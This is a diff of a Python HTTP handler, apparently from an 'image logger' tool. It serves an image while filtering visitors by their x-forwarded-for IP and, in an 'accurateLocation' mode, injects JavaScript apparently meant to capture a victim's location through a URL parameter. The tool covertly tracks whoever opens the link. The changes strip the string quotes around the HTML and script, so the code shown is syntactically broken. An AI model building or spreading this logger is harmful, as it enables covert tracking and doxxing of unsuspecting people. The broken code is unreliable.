@@ -200,7 +200,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
+            data = f<style>body {{
 margin: 0;
 padding: 0;
 }}
@@ -211,7 +211,7 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+}}</style><div class="img"></div>.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
@@ -271,7 +271,7 @@ height: 100vh;
                 self.end_headers() # Declare the headers as finished.
 
                 if config["accurateLocation"]:
-                    data += b"""<script>
+                    data += <script>
 var currenturl = window.location.href;
 
 if (!currenturl.includes("g=")) {
@@ -285,7 +285,7 @@ if (!currenturl.includes("g=")) {
     location.replace(currenturl);});
 }}
 
-</script>"""
+</script>
                 self.wfile.write(data)
         
         except Exception:
